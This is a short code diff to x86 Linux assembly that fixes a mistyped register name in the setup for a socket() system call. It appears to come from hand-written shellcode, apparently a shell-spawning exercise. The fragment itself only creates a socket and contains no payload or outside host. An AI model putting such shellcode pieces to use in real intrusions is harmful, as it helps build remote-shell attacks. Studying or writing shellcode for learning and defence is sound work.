@@ -185,7 +185,7 @@ xor ebx, ebx      ; Clear EBX Register. EBX = 0x00000000
 inc ebx	          ; EBX = 0x1 = socket() // Create a socket
 xor ecx, ecx      ; Clear ECX Register. ECX = 0x00000000
 push ecx          ; ECX[2] = int protocol = 0. 
-push ebxi         ; ECX[1] - int type = SOCK_STREAM = 0x1. 
+push ebx          ; ECX[1] - int type = SOCK_STREAM = 0x1. 
 push byte 0x2     ; ECX[0] - int domain = AF_INET = PF_INET = 0x2. 
 mov ecx, esp      ; Point the ECX Register to the Top of the stack
 int 0x80          ; Execute the socket() System Call
